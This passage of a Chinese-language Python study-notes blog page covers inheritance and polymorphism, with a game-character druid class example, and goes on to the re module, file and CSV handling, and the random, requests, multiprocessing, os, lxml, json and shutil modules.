class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">class Druid(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self,name,level):</span><br><span class="line">        self._name = name</span><br><span class="line">        self._level = level</span><br><span class="line">    </span><br><span class="line">    @property</span><br><span class="line">    def name(self):</span><br><span class="line">        return self._name</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line">    def level(self):</span><br><span class="line">        return self._level</span><br><span class="line"></span><br><span class="line">    @level.setter</span><br><span class="line">    def level(self,level):</span><br><span class="line">        self._level = level</span><br><span class="line">    </span><br><span class="line">    def __str__(self):</span><br><span class="line">        return &apos;%s,%d&apos; %(self._name,self._level)</span><br><span class="line"></span><br><span class="line">    def choose_pro(self):</span><br><span class="line">        if self._level &gt;= 10:</span><br><span class="line">            print(&apos;%s可以选择专精&apos; %self._name)</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;%s不可以选择专精&apos; %self._name)</span><br><span class="line"></span><br><span class="line">    def farming(self):</span><br><span class="line">        print(&apos;%s正在做任务练级……&apos; %self._name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Feral(Druid):</span><br><span class="line">    </span><br><span class="line">    def __init__(self,name,level,spell):</span><br><span class="line">        super().__init__(name,level)</span><br><span class="line">        self._spell = []</span><br><span class="line">        self._spell.append(spell)</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line">    def spell(self):</span><br><span class="line">        return self._spell</span><br><span class="line"></span><br><span class="line">    @spell.setter</span><br><span class="line">    def spell(self,spell):</span><br><span class="line">        self._spell.append(spell)</span><br><span class="line"></span><br><span class="line">    def study(self,course):</span><br><span class="line">        print(&apos;%s正在学习%s&apos; %(self._name,course))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Restoration(Druid):</span><br><span class="line">    </span><br><span class="line">    def __init__(self,name,level,spell):</span><br><span class="line">        super().__init__(name,level)</span><br><span class="line">        self._spell = []</span><br><span class="line">        self._spell.append(spell)</span><br><span class="line">    </span><br><span class="line">    @property</span><br><span class="line">    def spell(self):</span><br><span class="line">        return self._spell</span><br><span class="line"></span><br><span class="line">    @spell.setter</span><br><span class="line">    def spell(self,spell):</span><br><span class="line">        self._spell.append(spell)</span><br><span class="line"></span><br><span class="line">    def study(self,course):</span><br><span class="line">        print(&apos;%s正在学习%s&apos; %(self.name,course))</span><br><span class="line"></span><br><span class="line">    def healing(self,target):</span><br><span class="line">        print(&apos;%s正在释放%s治疗%s&apos; %(self._name,self._spell[0],target))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    chessur = Feral(&apos;chessur&apos;,60,&apos;rake&apos;)</span><br><span class="line">    chessur.study(&apos;bite&apos;)</span><br><span class="line">    chessur.spell = &apos;cat form&apos;</span><br><span class="line">    print(chessur.spell)</span><br><span class="line">    windy = Restoration(&apos;Windy&apos;,10,&apos;Rejuvenation&apos;)</span><br><span class="line">    windy.healing(&apos;chessur&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h4 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h4><p>一个子类可以继承多个父类的属性和方法，相同方法名，以第一个父类为准</p>
<h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p>子类在继承父类的方法后，可以<strong>重写(override)</strong>父类的方法，通过方法重写，可以让父类的一个方法在子类中拥有不同的版本。当子类调用重写的方法时，不同的子类对象会表现出不同的行为，这就是多态</p>
<h4 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h4><p>不能创建对象的类，专门为了让其他类去继承它。Python没有办法直接设置抽象类，可以通过<code>abc</code>模块的<code>ABCMeta</code>元类和<code>abstractmethod</code>装饰器来达到抽象类的效果，如果一个类中存在抽象方法，那么这个类就不能实例化。</p>
<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h2><p>regular expression</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br></pre></td></tr></table></figure>
<p>正则表达式前添加<code>r</code>原始字符串，让字符串中的每个字符都是原始的意义。因为正则表达式中有很多元字符和需要进行转义的地方，如果不适用原始字符串就需要将反斜杠写成<code>\\</code>，这样写不仅不方便，也不便于阅读</p>
<h3 id="compile"><a href="#compile" class="headerlink" title="compile()"></a>compile()</h3><p>编译正则表达式返回正则表达式对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.compile(pattern,flags=0)</span><br></pre></td></tr></table></figure>
<p>使用compile()时，需要把flags提前放在compile()里</p>
<h3 id="match"><a href="#match" class="headerlink" title="match()"></a>match()</h3><p>用正则表达式匹配字符串，成功返回匹配对象，否则返回None</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(pattern,string,flags=0)</span><br></pre></td></tr></table></figure>
<h3 id="search"><a href="#search" class="headerlink" title="search()"></a>search()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.search(pattern,string,flags=0)</span><br></pre></td></tr></table></figure>
<p>search()方法返回第一个匹配的值</p>
<p>形式为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;re.Match object; span=(12, 27), match=&apos;密码是：weibomima1，&apos;&gt;</span><br></pre></td></tr></table></figure>
<p>使用group()获得search()返回的结果</p>
<p>使用group(0)获得search()返回的结果中分组的值</p>
<h3 id="split-1"><a href="#split-1" class="headerlink" title="split()"></a>split()</h3><p>用正则表达式指定的模式分割符拆分字符，返回列表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.split(pattern,string,maxsplit=0,flags=0)</span><br></pre></td></tr></table></figure>
<h3 id="sub"><a href="#sub" class="headerlink" title="sub()"></a>sub()</h3><p>用指定的字符串替换原字符串中与正则表达式匹配的模式，可以用count指定替换的次数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.sub(pattern,repl,string,count=0,flags=0)</span><br></pre></td></tr></table></figure>
<h3 id="fullmatch"><a href="#fullmatch" class="headerlink" title="fullmatch()"></a>fullmatch()</h3><p>match函数的完全匹配(从字符串开头到结尾)版本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.fullmatch(pattern,string,flags=0)</span><br></pre></td></tr></table></figure>
<h3 id="findall"><a href="#findall" class="headerlink" title="findall()"></a>findall()</h3><p>查找字符串所有与正则表达式匹配的模式，返回字符串的列表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.findall(pattern,string,flags=0)</span><br></pre></td></tr></table></figure>
<p>re模块包含一个findall()方法它能够以列表形式返回所有满足要求的字符串，若没有匹配到结果，就会返回空列表。<code>flags</code>表示一些特殊功能的标志</p>
<h3 id="finditer"><a href="#finditer" class="headerlink" title="finditer()"></a>finditer()</h3><p>查找字符串所有与正则表达式匹配的模式，返回一个迭代器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.finditer(pattern,string,flags=0)</span><br></pre></td></tr></table></figure>
<h3 id="purge"><a href="#purge" class="headerlink" title="purge()"></a>purge()</h3><p>清除隐式编译的正则表达式的缓存</p>
<h3 id="re-S"><a href="#re-S" class="headerlink" title="re.S"></a>re.S</h3><p>标记：将<code>.</code>的作用扩展到整个字符串，包括<code>\n</code></p>
<h3 id="re-I"><a href="#re-I" class="headerlink" title="re.I"></a>re.I</h3><p>标记：忽略大小写匹配</p>
<h3 id="re-M"><a href="#re-M" class="headerlink" title="re.M"></a>re.M</h3><p>标记：多行匹配</p>
<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><table>
<thead>
<tr>
<th style="text-align:center">mode</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>&#39;r&#39;</code></td>
<td style="text-align:center">读取(默认)</td>
</tr>
<tr>
<td style="text-align:center"><code>&#39;w&#39;</code></td>
<td style="text-align:center">写入，会删除之前的内容</td>
</tr>
<tr>
<td style="text-align:center"><code>&#39;x&#39;</code></td>
<td style="text-align:center">写入，如果文件已存在会产生异常</td>
</tr>
<tr>
<td style="text-align:center"><code>&#39;a&#39;</code></td>
<td style="text-align:center">追加，将内容写入已有文件的末尾</td>
</tr>
<tr>
<td style="text-align:center"><code>&#39;b&#39;</code></td>
<td style="text-align:center">二进制模式</td>
</tr>
<tr>
<td style="text-align:center"><code>&#39;t&#39;</code></td>
<td style="text-align:center">文本模式(默认)</td>
</tr>
<tr>
<td style="text-align:center"><code>&#39;+&#39;</code></td>
<td style="text-align:center">更新，既可读又可写</td>
</tr>
</tbody>
</table>
<h2 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h2><p>Python文件操作mode如果想读取，必须为<code>&#39;r&#39;</code></p>
<h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file = open (&apos;文件路径&apos;,&apos;文件操作方式&apos;,encoding=&apos;utf-8&apos;)</span><br><span class="line">对文件进行操作</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&apos;文件路径&apos;,&apos;文件操作方式&apos;,encoding=&apos;utf-8&apos;) as file:</span><br><span class="line">	对文件进行操作</span><br></pre></td></tr></table></figure>
<p>第一种需要手动给关闭文件<br>第二种需要注意缩进，退出缩进Python就会自动关闭文件</p>
<h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><p>读取文件可以使用相对路径和绝对路径<br>相对路径是文本文件相对于现在的工作区而言的路径，并不总是相对于当前正在运行的这个Python文件的路径</p>
<p>Python需要导入os模块来使用<code>~</code>表示家目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">real_path=os.path.expanduse(&apos;~/project/xxx&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="打开文件-1"><a href="#打开文件-1" class="headerlink" title="打开文件"></a>打开文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&apos;文件路径&apos;,&apos;r&apos;,encoding=&apos;utf-8&apos;) as file:</span><br><span class="line">	对文件进行操作</span><br></pre></td></tr></table></figure>
<h3 id="readlines"><a href="#readlines" class="headerlink" title="readlines()"></a>readlines()</h3><p>读取文件内容，将文件的每一行作为列表元素返回<br>readlines()会将文件内容取出，如果再次使用read()读取会返回空值</p>
<h3 id="read"><a href="#read" class="headerlink" title="read()"></a>read()</h3><p>读取文件内容，将所有内容作为字符串返回</p>
<h3 id="readline"><a href="#readline" class="headerlink" title="readline()"></a>readline()</h3><p>每次读取一行，使用循环读取所有内容</p>
<h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&apos;文件路径&apos;,&apos;w&apos;,encoding=&apos;utf-8&apos;) as file:</span><br><span class="line">	对文件进行操作</span><br></pre></td></tr></table></figure>
<p>写文件有2种，w和a</p>
<p>w覆盖掉之前的内容，a是追加内容</p>
<h3 id="write"><a href="#write" class="headerlink" title="write()"></a>write()</h3><p>直接将一段字符串写入文本</p>
<h3 id="writelines"><a href="#writelines" class="headerlink" title="writelines()"></a>writelines()</h3><p><code>writelines([&#39;line0&#39;,&#39;line1&#39;])</code></p>
<p>在写文件时，Python不会添加换行符，需要手动添加</p>
<h2 id="操作CSV文件"><a href="#操作CSV文件" class="headerlink" title="操作CSV文件"></a>操作CSV文件</h2><p>Python自带处理CSV文件的模块</p>
<p>Python处理CSV文件需要有序字典形式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br></pre></td></tr></table></figure>
<h3 id="读CSV文件"><a href="#读CSV文件" class="headerlink" title="读CSV文件"></a>读CSV文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">with open(&apos;csvfile&apos;,&apos;r&apos;,encoding=&apos;utf-8&apos;) as csvfile:</span><br><span class="line">	reader = csv.DictReader(file)</span><br><span class="line">	for row in reader:</span><br><span class="line">		print(row)</span><br></pre></td></tr></table></figure>
<h3 id="写CSV文件"><a href="#写CSV文件" class="headerlink" title="写CSV文件"></a>写CSV文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">with open(&apos;csvfile&apos;,&apos;a&apos;,encoding=&apos;utf-8&apos;) as csvfile:</span><br><span class="line">	writer = csv.DictWriter(csvfile,fieldnames=[&apos;name&apos;,&apos;age&apos;,&apos;salary&apos;])</span><br><span class="line">	writer.writeheader()</span><br><span class="line">	writer.writerows(data)</span><br><span class="line">	writer.writerow(&#123;&apos;name&apos;:Greeny,&apos;age&apos;:24,&apos;salary&apos;:99999&#125;)</span><br></pre></td></tr></table></figure>
<h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><h2 id="random模块"><a href="#random模块" class="headerlink" title="random模块"></a>random模块</h2><h4 id="random-randint"><a href="#random-randint" class="headerlink" title="random.randint()"></a>random.randint()</h4><p>生成整数随机数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">random.randint(1,6)</span><br></pre></td></tr></table></figure>
<h4 id="random-randrange"><a href="#random-randrange" class="headerlink" title="random.randrange()"></a>random.randrange()</h4><p>可设置步长，默认为1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">random.randrange ([start,] stop [,step])</span><br><span class="line">random.randrange(1,100,2)</span><br><span class="line">//生成奇数随机数</span><br></pre></td></tr></table></figure>
<h4 id="random-random"><a href="#random-random" class="headerlink" title="random.random()"></a>random.random()</h4><p>随机生成0~1之间的浮点数</p>
<h4 id="random-sample"><a href="#random-sample" class="headerlink" title="random.sample()"></a>random.sample()</h4><p>返回序列(列表、元组、字符串、Unicode字符串、buffer对象、xrange对象)中指定个数的随机切片</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list = [x for x in range(1,10)]</span><br><span class="line">random.sample(list,5)</span><br><span class="line">//[1,2,3,4,6]</span><br></pre></td></tr></table></figure>
<h2 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h2><h3 id="requests-get"><a href="#requests-get" class="headerlink" title="requests.get()"></a>requests.get()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.get(&apos;url&apos;)</span><br></pre></td></tr></table></figure>
<p>返回Response对象</p>
<h3 id="Response-content"><a href="#Response-content" class="headerlink" title="Response.content"></a>Response.content</h3><p>返回二进制格式的网页内容</p>
<h3 id="Response-content-decode"><a href="#Response-content-decode" class="headerlink" title="Response.content.decode()"></a>Response.content.decode()</h3><p>解码为字符格式的网页内容<br>该方法默认参数为<code>&#39;utf-8&#39;</code>，需要根据不同网页进行更改，其他参数有<code>&#39;GBK&#39;</code>，<code>&#39;GB2312&#39;</code>，<code>&#39;GB18030&#39;</code></p>
<h3 id="Response-json"><a href="#Response-json" class="headerlink" title="Response.json()"></a>Response.json()</h3><p>返回Json格式的Response</p>
<h3 id="requests-status-code"><a href="#requests-status-code" class="headerlink" title="requests.status_code"></a>requests.status_code</h3><p>返回响应状态码</p>
<p>内置的状态码查询对象：<code>requests.codes.ok</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">html = requests.get(url)</span><br><span class="line">html.status_code</span><br><span class="line">html.status_code == requests.codes.ok</span><br></pre></td></tr></table></figure>
<h2 id="multiprocessing模块"><a href="#multiprocessing模块" class="headerlink" title="multiprocessing模块"></a>multiprocessing模块</h2><h3 id="dummy模块"><a href="#dummy模块" class="headerlink" title="dummy模块"></a>dummy模块</h3><p>dummy下有一个Pool类，用来实现线程池，线程池下有一个map()方法，可以让线程池里面的所有线程都“同时”执行一个函数</p>
<h4 id="Pool-map"><a href="#Pool-map" class="headerlink" title="Pool.map()"></a>Pool.map()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pool.map(function,iterable)</span><br></pre></td></tr></table></figure>
<p>第一个参数为函数，第二个参数为可迭代的对象：列表、元组、集合、字典</p>
<h3 id="multiprocessing-Process"><a href="#multiprocessing-Process" class="headerlink" title="multiprocessing.Process"></a>multiprocessing.Process</h3><h4 id="创建子进程"><a href="#创建子进程" class="headerlink" title="创建子进程"></a>创建子进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import multiprocessing</span><br><span class="line">p1 = multiprocessing.Process(target = study,args = (&apos;chessur&apos;,))</span><br></pre></td></tr></table></figure>
<h4 id="启动子进程"><a href="#启动子进程" class="headerlink" title="启动子进程"></a>启动子进程</h4><p>multiprocessing.Process.start()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import multiprocessing</span><br><span class="line">p1 = multiprocessing.Process(target = study,args = (&apos;chessur&apos;,))</span><br><span class="line">p1.start()</span><br></pre></td></tr></table></figure>
<h4 id="等待子进程结束"><a href="#等待子进程结束" class="headerlink" title="等待子进程结束"></a>等待子进程结束</h4><p>multiprocessing.Process.join()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import multiprocessing</span><br><span class="line">p1 = multiprocessing.Process(target = study,args = (&apos;chessur&apos;,))</span><br><span class="line">p1.start()</span><br><span class="line">p1.join()</span><br></pre></td></tr></table></figure>
<h2 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h2><h3 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h3><h4 id="os-makedirs"><a href="#os-makedirs" class="headerlink" title="os.makedirs()"></a>os.makedirs()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.makedirs(&apos;目录名&apos;,exist_ok=True)</span><br></pre></td></tr></table></figure>
<p><code>exis_ok=True</code>当存在相同目录名时，不再创建</p>
<h4 id="os-path-join"><a href="#os-path-join" class="headerlink" title="os.path.join()"></a>os.path.join()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.path.join(&apos;目录名&apos;,filename+&apos;.后缀名&apos;)</span><br></pre></td></tr></table></figure>
<p>python会根据系统环境(Windows,Linux)添加斜杠</p>
<h4 id="os-listdir"><a href="#os-listdir" class="headerlink" title="os.listdir()"></a>os.listdir()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.listdir(&apos;dir&apos;)</span><br></pre></td></tr></table></figure>
<p>返回列表，列表元素为文件名</p>
<h4 id="os-rename"><a href="#os-rename" class="headerlink" title="os.rename()"></a>os.rename()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.rename(&apos;原文件名&apos;,&apos;新文件名&apos;)</span><br></pre></td></tr></table></figure>
<h4 id="os-system"><a href="#os-system" class="headerlink" title="os.system()"></a>os.system()</h4><p>执行系统命令</p>
<p>和<code>subprocess.Popen()</code>的区别：<code>subprocess</code>可以将执行结果通过STDOUT赋给变量</p>
<h4 id="os-getpid"><a href="#os-getpid" class="headerlink" title="os.getpid()"></a>os.getpid()</h4><p>获取进程号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.getpid()</span><br></pre></td></tr></table></figure>
<h2 id="lxml模块"><a href="#lxml模块" class="headerlink" title="lxml模块"></a>lxml模块</h2><h3 id="XPath语法"><a href="#XPath语法" class="headerlink" title="XPath语法"></a>XPath语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info = selector.xpath(&apos;//div[@class=&quot;useful&quot;]/ul/li/test()&apos;)</span><br></pre></td></tr></table></figure>
<p>直接返回列表，列表中是需要提取的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import lxml.html</span><br><span class="line">selector = lxml.fromstring(&apos;网页源代码&apos;)</span><br><span class="line">info = selector.xpath(&apos;XPath语句&apos;)</span><br></pre></td></tr></table></figure>
<p>获取文本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//标签1[@属性1=&quot;属性值1&quot;]/标签2[@属性2=&quot;属性值2&quot;]/.../text()</span><br></pre></td></tr></table></figure>
<p>获取属性值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//标签1[@属性1=&quot;属性值1&quot;]/标签2[@属性2=&quot;属性值2&quot;]/.../@属性n</span><br></pre></td></tr></table></figure>
<p>需要使用独特的标签属性值过滤</p>
<p>属性以某些字符串开头</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//标签[starts-with(@属性名,&quot;相同的开头部分&quot;)]</span><br><span class="line">//div[starts-with(@id,&quot;test&quot;)]/test()</span><br></pre></td></tr></table></figure>
<h2 id="json模块"><a href="#json模块" class="headerlink" title="json模块"></a>json模块</h2><p>将Python中的对象以JSON格式保存到文件中</p>
<h3 id="json-dump"><a href="#json-dump" class="headerlink" title="json.dump()"></a>json.dump()</h3><p>将Python对象按照JSON格式序列化到文件中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line"></span><br><span class="line">my_dict = &#123;&apos;name&apos;:&apos;chessur&apos;,&apos;level&apos;:60,&apos;spec&apos;:&apos;Feral&apos;&#125;</span><br><span class="line">with open (&apos;test.json&apos;,&apos;w&apos;,encoding = &apos;utf-8&apos;) as file:</span><br><span class="line">    json.dump(my_dict,file)</span><br><span class="line"></span><br><span class="line">//&#123;&quot;name&quot;: &quot;chessu&quot;, &quot;level&quot;: 60, &quot;spec&quot;: &quot;Feral&quot;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="json-dumps"><a href="#json-dumps" class="headerlink" title="json.dumps()"></a>json.dumps()</h3><p>将Python对象处理成JSON格式的字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">my_dict = &#123;&apos;name&apos;:&apos;chessur&apos;,&apos;level&apos;:60,&apos;spec&apos;:&apos;Feral&apos;&#125;</span><br><span class="line">print(json.dumps(my_dict))</span><br><span class="line"></span><br><span class="line">//&#123;&quot;name&quot;: &quot;chessu&quot;, &quot;level&quot;: 60, &quot;spec&quot;: &quot;Feral&quot;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="json-load"><a href="#json-load" class="headerlink" title="json.load()"></a>json.load()</h3><p>将文件中的JSON数据反序列化称为Python对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">with open (&apos;test.json&apos;,&apos;r&apos;,encoding = &apos;utf-8&apos;) as file:</span><br><span class="line">    string = json.load(file)</span><br><span class="line">print(string)</span><br><span class="line">//&#123;&quot;name&quot;: &quot;chessu&quot;, &quot;level&quot;: 60, &quot;spec&quot;: &quot;Feral&quot;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="json-loads"><a href="#json-loads" class="headerlink" title="json.loads()"></a>json.loads()</h3><p>将字符串的内容反序列化成Python对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">my_dict = &#123;&apos;name&apos;:&apos;chessur&apos;,&apos;level&apos;:60,&apos;spec&apos;:&apos;Feral&apos;&#125;</span><br><span class="line">string = json.dumps(my_dict)</span><br><span class="line">string1 = json.loads(string)</span><br></pre></td></tr></table></figure>
<h2 id="csv模块"><a href="#csv模块" class="headerlink" title="csv模块"></a>csv模块</h2><h3 id="csv-reader"><a href="#csv-reader" class="headerlink" title="csv.reader()"></a>csv.reader()</h3><p>获取csv文件中的内容，返回<code>csv reader</code>对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># example.csv</span><br><span class="line">chessur,Druid,60</span><br><span class="line">Windy,Priest,40</span><br><span class="line">Andy,Hunter,60</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">with open(&apos;chessur.csv&apos;,&apos;r&apos;,encoding = &apos;utf-8&apos;) as file:</span><br><span class="line">    data = csv.reader(file)</span><br><span class="line">    data_list = list(data)</span><br><span class="line">for item in data_list:</span><br><span class="line">    print(&apos;%-10s%-10s%-10s&apos; %(item[0],item[1],item[2]))</span><br></pre></td></tr></table></figure>
<h2 id="shutil模块"><a href="#shutil模块" class="headerlink" title="shutil模块"></a>shutil模块</h2><p>提供了复制文件及文件夹的功能</p>
<h3 id="shutil-copyfile"><a href="#shutil-copyfile" class="headerlink" title="shutil.copyfile()"></a>shutil.copyfile()</h3><p>复制文件内容到src</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutil.copy(src,dst)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import shutil</span><br><span class="line">shutil.copyfile(&apos;./test.txt&apos;,&apos;./test2.txt&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="shutil-copymode"><a href="#shutil-copymode" class="headerlink" title="shutil.copymode()"></a>shutil.copymode()</h3><p>将src文件权限复制到dst文件，文件内容，所有者和组不受影响</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutil.copymode(src,dst)</span><br></pre></td></tr></table></figure>
